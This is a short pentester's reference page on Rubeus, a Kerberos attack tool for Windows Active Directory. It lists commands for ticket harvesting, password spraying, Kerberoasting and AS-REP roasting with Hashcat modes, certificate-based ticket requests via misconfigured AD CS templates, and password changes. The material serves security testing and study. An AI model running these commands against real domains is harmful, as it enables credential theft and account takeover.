<!DOCTYPE html>
<html lang="en"><head><title>Rubeus :: Cardboard Iguana Security</title><meta charset="utf-8"/><link rel="preconnect" href="https://fonts.googleapis.com"/><link rel="preconnect" href="https://fonts.gstatic.com"/><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto Sans Mono&amp;family=Noto Sans:wght@400;700&amp;family=Noto Sans:ital,wght@0,400;0,600;1,400;1,600&amp;display=swap"/><link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin="anonymous"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta name="og:site_name" content="Cardboard Iguana Security"/><meta property="og:title" content="Rubeus :: Cardboard Iguana Security"/><meta property="og:type" content="website"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:title" content="Rubeus :: Cardboard Iguana Security"/><meta name="twitter:description" content="Rubeus is a Windows-only post-exploitation tool for attacking Kerberos. No compiled binaries are available (either through the GitHub repo or Kali Linux’s windows-binaries package)."/><meta property="og:description" content="Rubeus is a Windows-only post-exploitation tool for attacking Kerberos. No compiled binaries are available (either through the GitHub repo or Kali Linux’s windows-binaries package)."/><meta property="og:image:type" content="image/webp"/><meta property="og:image:alt" content="Rubeus is a Windows-only post-exploitation tool for attacking Kerberos. No compiled binaries are available (either through the GitHub repo or Kali Linux’s windows-binaries package)."/><meta property="og:image:width" content="1200"/><meta property="og:image:height" content="630"/><meta property="og:image:url" content="https://cardboard-iguana.com/grimoire/static/social-images/..-obsidian-spells-Rubeus.md.webp"/><meta name="twitter:image" content="https://cardboard-iguana.com/grimoire/static/social-images/..-obsidian-spells-Rubeus.md.webp"/><meta property="og:image" content="https://cardboard-iguana.com/grimoire/static/social-images/..-obsidian-spells-Rubeus.md.webp"/><meta property="twitter:domain" content="cardboard-iguana.com/grimoire"/><meta property="og:url" content="https://cardboard-iguana.com/grimoire/spells/Rubeus"/><meta property="twitter:url" content="https://cardboard-iguana.com/grimoire/spells/Rubeus"/><link rel="icon" href="../static/icon.png"/><meta name="description" content="Rubeus is a Windows-only post-exploitation tool for attacking Kerberos. No compiled binaries are available (either through the GitHub repo or Kali Linux’s windows-binaries package)."/><meta name="generator" content="Quartz"/><link href="../index.css" rel="stylesheet" type="text/css" spa-preserve/><script src="../prescript.js" type="application/javascript" spa-preserve></script><script type="application/javascript" spa-preserve>const fetchData = fetch("../static/contentIndex.json").then(data => data.json())</script></head><body data-slug="spells/Rubeus"><div id="quartz-root" class="page"><div id="quartz-body"><div class="left sidebar"></div><div class="center"><div class="page-header"><header><nav class="breadcrumb-container" aria-label="breadcrumbs"><div class="breadcrumb-element"><a href="..">Cardboard Iguana Security</a><p> / </p></div><div class="breadcrumb-element"><a href="../spells">spells</a><p> / </p></div><div class="breadcrumb-element"><a href>Rubeus</a></div></nav><div class="spacer"></div><button class="darkmode" id="darkmode"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="dayIcon" x="0px" y="0px" viewBox="0 0 35 35" style="enable-background:new 0 0 35 35" xml:space="preserve" aria-label="Dark mode"><title>Dark mode</title><path d="M6,17.5C6,16.672,5.328,16,4.5,16h-3C0.672,16,0,16.672,0,17.5    S0.672,19,1.5,19h3C5.328,19,6,18.328,6,17.5z M7.5,26c-0.414,0-0.789,0.168-1.061,0.439l-2,2C4.168,28.711,4,29.086,4,29.5    C4,30.328,4.671,31,5.5,31c0.414,0,0.789-0.168,1.06-0.44l2-2C8.832,28.289,9,27.914,9,27.5C9,26.672,8.329,26,7.5,26z M17.5,6    C18.329,6,19,5.328,19,4.5v-3C19,0.672,18.329,0,17.5,0S16,0.672,16,1.5v3C16,5.328,16.671,6,17.5,6z M27.5,9    c0.414,0,0.789-0.168,1.06-0.439l2-2C30.832,6.289,31,5.914,31,5.5C31,4.672,30.329,4,29.5,4c-0.414,0-0.789,0.168-1.061,0.44    l-2,2C26.168,6.711,26,7.086,26,7.5C26,8.328,26.671,9,27.5,9z M6.439,8.561C6.711,8.832,7.086,9,7.5,9C8.328,9,9,8.328,9,7.5    c0-0.414-0.168-0.789-0.439-1.061l-2-2C6.289,4.168,5.914,4,5.5,4C4.672,4,4,4.672,4,5.5c0,0.414,0.168,0.789,0.439,1.06    L6.439,8.561z M33.5,16h-3c-0.828,0-1.5,0.672-1.5,1.5s0.672,1.5,1.5,1.5h3c0.828,0,1.5-0.672,1.5-1.5S34.328,16,33.5,16z     M28.561,26.439C28.289,26.168,27.914,26,27.5,26c-0.828,0-1.5,0.672-1.5,1.5c0,0.414,0.168,0.789,0.439,1.06l2,2    C28.711,30.832,29.086,31,29.5,31c0.828,0,1.5-0.672,1.5-1.5c0-0.414-0.168-0.789-0.439-1.061L28.561,26.439z M17.5,29    c-0.829,0-1.5,0.672-1.5,1.5v3c0,0.828,0.671,1.5,1.5,1.5s1.5-0.672,1.5-1.5v-3C19,29.672,18.329,29,17.5,29z M17.5,7    C11.71,7,7,11.71,7,17.5S11.71,28,17.5,28S28,23.29,28,17.5S23.29,7,17.5,7z M17.5,25c-4.136,0-7.5-3.364-7.5-7.5    c0-4.136,3.364-7.5,7.5-7.5c4.136,0,7.5,3.364,7.5,7.5C25,21.636,21.636,25,17.5,25z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="nightIcon" x="0px" y="0px" viewBox="0 0 100 100" style="enable-background:new 0 0 100 100" xml:space="preserve" aria-label="Light mode"><title>Light mode</title><path d="M96.76,66.458c-0.853-0.852-2.15-1.064-3.23-0.534c-6.063,2.991-12.858,4.571-19.655,4.571  C62.022,70.495,50.88,65.88,42.5,57.5C29.043,44.043,25.658,23.536,34.076,6.47c0.532-1.08,0.318-2.379-0.534-3.23  c-0.851-0.852-2.15-1.064-3.23-0.534c-4.918,2.427-9.375,5.619-13.246,9.491c-9.447,9.447-14.65,22.008-14.65,35.369  c0,13.36,5.203,25.921,14.65,35.368s22.008,14.65,35.368,14.65c13.361,0,25.921-5.203,35.369-14.65  c3.872-3.871,7.064-8.328,9.491-13.246C97.826,68.608,97.611,67.309,96.76,66.458z"></path></svg></button><div class="search"><button class="search-button" id="search-button"><p>Search</p><svg role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 19.9 19.7"><title>Search</title><g class="search-path" fill="none"><path stroke-linecap="square" d="M18.5 18.3l-5.4-5.4"></path><circle cx="8" cy="8" r="7"></circle></g></svg></button><div id="search-container"><div id="search-space"><input autocomplete="off" id="search-bar" name="search" type="text" aria-label="Search for something" placeholder="Search for something"/><div id="search-layout" data-preview="true"></div></div></div></div></header><div class="popover-hint"><p show-comma="true" class="content-meta"><time datetime="2025-01-05T17:46:30.974Z">Sunday, January 5, 2025</time><span>2 min read</span></p><ul class="tags"><li><a href="../tags/Application/Rubeus" class="internal tag-link">Application/Rubeus</a></li><li><a href="../tags/Protocol/Kerberos" class="internal tag-link">Protocol/Kerberos</a></li><li><a href="../tags/OS/Windows/ActiveDirectory" class="internal tag-link">OS/Windows/ActiveDirectory</a></li><li><a href="../tags/AttackCycle/Reconnaissance" class="internal tag-link">AttackCycle/Reconnaissance</a></li><li><a href="../tags/AttackCycle/Exploitation/BruteForcing" class="internal tag-link">AttackCycle/Exploitation/BruteForcing</a></li><li><a href="../tags/OS/Linux/Distros/Kali" class="internal tag-link">OS/Linux/Distros/Kali</a></li><li><a href="../tags/AttackCycle/PrivEsc" class="internal tag-link">AttackCycle/PrivEsc</a></li><li><a href="../tags/Application/Certify" class="internal tag-link">Application/Certify</a></li><li><a href="../tags/AttackCycle/LateralMovement" class="internal tag-link">AttackCycle/LateralMovement</a></li></ul></div></div><article class="popover-hint"><p><a href="https://github.com/GhostPack/Rubeus" class="external" target="_blank">Rubeus<svg aria-hidden="true" class="external-icon" style="max-width:0.8em;max-height:0.8em;" viewBox="0 0 512 512"><path d="M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z"></path></svg></a> is a Windows-only post-exploitation tool for attacking <a href="../spells/Kerberos" class="internal alias" data-slug="spells/Kerberos">Kerberos</a>. No compiled binaries are available (either through the GitHub repo or Kali Linux’s windows-binaries package).</p>
<blockquote class="callout important" data-callout="important">
<div class="callout-title">
                  <div class="callout-icon"></div>
                  <div class="callout-title-inner"><p>Important</p></div>
                  
                </div>
<div class="callout-content">
<p>To use Rebueus you need to already be on the domain you are attacking, or alternately need to have mapped the domain controller (which normally hosts the KDC) IP address properly in <code>C:\Windows\System32\drivers\etc\hosts</code>.</p>
</div>
</blockquote>
<h2 id="harvest-kerberos-tickets">Harvest Kerberos tickets<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#harvest-kerberos-tickets" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="powershell" data-theme="vitesse-light vitesse-dark"><code data-language="powershell" data-theme="vitesse-light vitesse-dark" style="display:grid;"><span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;"># Harvest ticket granting tickets observed by the current machine.</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;"># Probably works best when run on a domain controller.</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;">#</span></span>
<span data-line><span style="--shiki-light:#998418;--shiki-dark:#B8A965;">Rubeus.exe</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> harvest </span><span style="--shiki-light:#999999;--shiki-dark:#666666;">/</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">interval:</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">30</span></span></code></pre></figure>
<h2 id="password-spraying">Password spraying<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#password-spraying" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="powershell" data-theme="vitesse-light vitesse-dark"><code data-language="powershell" data-theme="vitesse-light vitesse-dark" style="display:grid;"><span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;"># Spray the specified password across all known users and generate a</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;"># ticket giving ticket for successful authentications. (Can trigger</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;"># account lockouts!)</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;">#</span></span>
<span data-line><span style="--shiki-light:#998418;--shiki-dark:#B8A965;">Rubeus.exe</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> brute </span><span style="--shiki-light:#999999;--shiki-dark:#666666;">/</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">password:ThePasswordToSpray </span><span style="--shiki-light:#999999;--shiki-dark:#666666;">/</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">noticket</span></span></code></pre></figure>
<h2 id="kerberoasting">Kerberoasting<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#kerberoasting" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
<p></p><blockquote class="transclude" data-url="Kerberoasting-with-Rubeus" data-block data-embed-alias="Kerberoasting with Rubeus"><h1>Kerberoasting with Rubeus</h1><figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="powershell" data-theme="vitesse-light vitesse-dark"><code data-language="powershell" data-theme="vitesse-light vitesse-dark" style="display:grid;"><span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;"># Extract password hashes for all known kerberoastable accounts using</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;"># Rubeus.</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;">#</span></span>
<span data-line><span style="--shiki-light:#998418;--shiki-dark:#B8A965;">Rubeus.exe</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> kerberoast</span></span></code></pre></figure>
<p>The password hashes output here can then be cracked with <a href="../spells/Kerberoasting-with-Rubeus/../../spells/Hashcat" class="internal alias" data-slug="spells/Hashcat">Hashcat</a> (use the 13100 hash mode).</p><a href="../spells/Kerberoasting-with-Rubeus" class="internal transclude-src">Link to original</a></blockquote><p></p>
<h2 id="as-rep-roasting">AS-REP roasting<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#as-rep-roasting" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
<p></p><blockquote class="transclude" data-url="AS-REP-roasting-With-Rubeus" data-block data-embed-alias="AS-REP roasting With Rubeus"><h1>AS-REP roasting With Rubeus</h1><figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="powershell" data-theme="vitesse-light vitesse-dark"><code data-language="powershell" data-theme="vitesse-light vitesse-dark" style="display:grid;"><span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;"># AS-REP roasting with Rubeus.</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;">#</span></span>
<span data-line><span style="--shiki-light:#998418;--shiki-dark:#B8A965;">Rubeus.exe</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> asreproast</span></span></code></pre></figure>
<p>To use <a href="../spells/AS-REP-roasting-With-Rubeus/../../spells/Hashcat" class="internal alias" data-slug="spells/Hashcat">Hashcat</a> to crack the hashes obtained in this fashion, first insert <code>23$</code> after the leading <code>$kerb5asrep$</code> (so <code>$kerb5asrep$</code> → <code>$kerb5asrep$23$</code>) and then use mode 18200.</p><a href="../spells/AS-REP-roasting-With-Rubeus" class="internal transclude-src">Link to original</a></blockquote><p></p>
<h2 id="use-a-certificate-to-request-a-ticket">Use a certificate to request a ticket<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#use-a-certificate-to-request-a-ticket" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
<p>Start by using <a href="https://github.com/GhostPack/Certify" class="external" target="_blank">Certify.exe<svg aria-hidden="true" class="external-icon" style="max-width:0.8em;max-height:0.8em;" viewBox="0 0 512 512"><path d="M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z"></path></svg></a> on the target:</p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="powershell" data-theme="vitesse-light vitesse-dark"><code data-language="powershell" data-theme="vitesse-light vitesse-dark" style="display:grid;"><span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;"># Identify vulnerable AD CS templates.</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;">#</span></span>
<span data-line><span style="--shiki-light:#998418;--shiki-dark:#B8A965;">Certify.exe</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> find </span><span style="--shiki-light:#999999;--shiki-dark:#666666;">/</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">vulnerable</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;"># Request a CSR using a vulnerable template.</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;">#</span></span>
<span data-line><span style="--shiki-light:#998418;--shiki-dark:#B8A965;">Certify.exe</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> request </span><span style="--shiki-light:#999999;--shiki-dark:#666666;">/</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">ca:</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;">AD_CS_CA</span><span style="--shiki-light:#999999;--shiki-dark:#666666;"> /</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">template:</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;">TEMPLATE_NAME</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> `</span></span>
<span data-line><span style="--shiki-light:#999999;--shiki-dark:#666666;">                    $</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;">OTHER_OPTIONS_AS_APPROPRIATE_TO_THE_ATTACK</span></span></code></pre></figure>
<p>Take the output of the last command above and paste it into a <code>$CERTIFICATE_PEM_FILE</code> on the attacking box. Then:</p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="vitesse-light vitesse-dark"><code data-language="bash" data-theme="vitesse-light vitesse-dark" style="display:grid;"><span data-line><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">openssl</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> pkcs12</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;"> -in</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;"> $CERTIFICATE_PEM_FILE</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;"> -keyex</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;"> \</span></span>
<span data-line><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;">               -CSP</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;"> &quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">Microsoft Enhanced Cryptographic Provider v1.0</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;">&quot;</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;"> \</span></span>
<span data-line><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;">               -export</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;"> -out</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;"> $CERTIFICATE_PFX_FILE</span></span></code></pre></figure>
<p>Move <code>$CERTIFICATE_PFX_FILE</code> back to the target, and then use <a href="../spells/Rubeus" class="internal alias" data-slug="spells/Rubeus">Rubeus</a> to seal the deal:</p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="powershell" data-theme="vitesse-light vitesse-dark"><code data-language="powershell" data-theme="vitesse-light vitesse-dark" style="display:grid;"><span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;"># Request a ticket using a certificate from AD CS.</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;">#</span></span>
<span data-line><span style="--shiki-light:#998418;--shiki-dark:#B8A965;">Rubeus.exe</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> asktgt </span><span style="--shiki-light:#999999;--shiki-dark:#666666;">/</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">user:</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;">USER</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> `</span></span>
<span data-line><span style="--shiki-light:#999999;--shiki-dark:#666666;">                  /</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">enctype:aes256 </span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">`</span></span>
<span data-line><span style="--shiki-light:#999999;--shiki-dark:#666666;">                  /</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">certificate:</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;">CERTIFICATE_PFX_FILE</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> `</span></span>
<span data-line><span style="--shiki-light:#999999;--shiki-dark:#666666;">                  /</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">password:</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;">CERTIFICATE_FILE_PASSWORD</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> `</span></span>
<span data-line><span style="--shiki-light:#999999;--shiki-dark:#666666;">                  /</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">outfile:</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;">TICKET_FILE</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> `</span></span>
<span data-line><span style="--shiki-light:#999999;--shiki-dark:#666666;">                  /</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">domain:</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;">DOMAIN</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> `</span></span>
<span data-line><span style="--shiki-light:#999999;--shiki-dark:#666666;">                  /</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">dc:</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;">DC_IP_ADDRESS</span></span></code></pre></figure>
<p>This is very useful if we’ve used an AD CS misconfiguration as described by <a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2" class="external" target="_blank">SpectreOps’ “Certified Pre-Owned” research<svg aria-hidden="true" class="external-icon" style="max-width:0.8em;max-height:0.8em;" viewBox="0 0 512 512"><path d="M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z"></path></svg></a> to forge a certificate that’s valid for another user.</p>
<h2 id="change-a-users-password">Change a user’s password<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#change-a-users-password" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="powershell" data-theme="vitesse-light vitesse-dark"><code data-language="powershell" data-theme="vitesse-light vitesse-dark" style="display:grid;"><span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;"># We can use Rubeus to change the password for domain users so long as</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;"># our ticket is for a user with permission to do so (generally the user</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;"># themselves or a domain admin.</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;">#</span></span>
<span data-line><span style="--shiki-light:#998418;--shiki-dark:#B8A965;">Rubeus.exe</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> changepw </span><span style="--shiki-light:#999999;--shiki-dark:#666666;">/</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">ticket:</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;">TICKET_FILE</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> `</span></span>
<span data-line><span style="--shiki-light:#999999;--shiki-dark:#666666;">                    /</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">new:</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;">NEW_PASSWORD</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> `</span></span>
<span data-line><span style="--shiki-light:#999999;--shiki-dark:#666666;">                    /</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">dc:</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;">DC_IP_ADDRESS</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> `</span></span>
<span data-line><span style="--shiki-light:#999999;--shiki-dark:#666666;">                    /</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">targetuser:</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;">DOMAIN</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">\</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;">USER</span></span></code></pre></figure></article><hr/><div class="page-footer"><div class="backlinks"><h3>Backlinks</h3><ul class="overflow"><li><a href="../spells/Enumerate-AD-CS-templates-with-CertUtil" class="internal">Enumerate AD CS templates with CertUtil</a></li><li><a href="../spells/Kerberos" class="internal">Kerberos</a></li><li><a href="../spells/Rubeus" class="internal">Rubeus</a></li></ul></div></div></div><div class="right sidebar"><div class="graph"><h3>Graph View</h3><div class="graph-outer"><div id="graph-container" data-cfg="{&quot;drag&quot;:true,&quot;zoom&quot;:true,&quot;depth&quot;:1,&quot;scale&quot;:1.1,&quot;repelForce&quot;:0.5,&quot;centerForce&quot;:0.3,&quot;linkDistance&quot;:30,&quot;fontSize&quot;:0.6,&quot;opacityScale&quot;:1,&quot;showTags&quot;:true,&quot;removeTags&quot;:[],&quot;focusOnHover&quot;:false}"></div><button id="global-graph-icon" aria-label="Global Graph"><svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 55 55" fill="currentColor" xml:space="preserve"><path d="M49,0c-3.309,0-6,2.691-6,6c0,1.035,0.263,2.009,0.726,2.86l-9.829,9.829C32.542,17.634,30.846,17,29,17
                s-3.542,0.634-4.898,1.688l-7.669-7.669C16.785,10.424,17,9.74,17,9c0-2.206-1.794-4-4-4S9,6.794,9,9s1.794,4,4,4
                c0.74,0,1.424-0.215,2.019-0.567l7.669,7.669C21.634,21.458,21,23.154,21,25s0.634,3.542,1.688,4.897L10.024,42.562
                C8.958,41.595,7.549,41,6,41c-3.309,0-6,2.691-6,6s2.691,6,6,6s6-2.691,6-6c0-1.035-0.263-2.009-0.726-2.86l12.829-12.829
                c1.106,0.86,2.44,1.436,3.898,1.619v10.16c-2.833,0.478-5,2.942-5,5.91c0,3.309,2.691,6,6,6s6-2.691,6-6c0-2.967-2.167-5.431-5-5.91
                v-10.16c1.458-0.183,2.792-0.759,3.898-1.619l7.669,7.669C41.215,39.576,41,40.26,41,41c0,2.206,1.794,4,4,4s4-1.794,4-4
                s-1.794-4-4-4c-0.74,0-1.424,0.215-2.019,0.567l-7.669-7.669C36.366,28.542,37,26.846,37,25s-0.634-3.542-1.688-4.897l9.665-9.665
                C46.042,11.405,47.451,12,49,12c3.309,0,6-2.691,6-6S52.309,0,49,0z M11,9c0-1.103,0.897-2,2-2s2,0.897,2,2s-0.897,2-2,2
                S11,10.103,11,9z M6,51c-2.206,0-4-1.794-4-4s1.794-4,4-4s4,1.794,4,4S8.206,51,6,51z M33,49c0,2.206-1.794,4-4,4s-4-1.794-4-4
                s1.794-4,4-4S33,46.794,33,49z M29,31c-3.309,0-6-2.691-6-6s2.691-6,6-6s6,2.691,6,6S32.309,31,29,31z M47,41c0,1.103-0.897,2-2,2
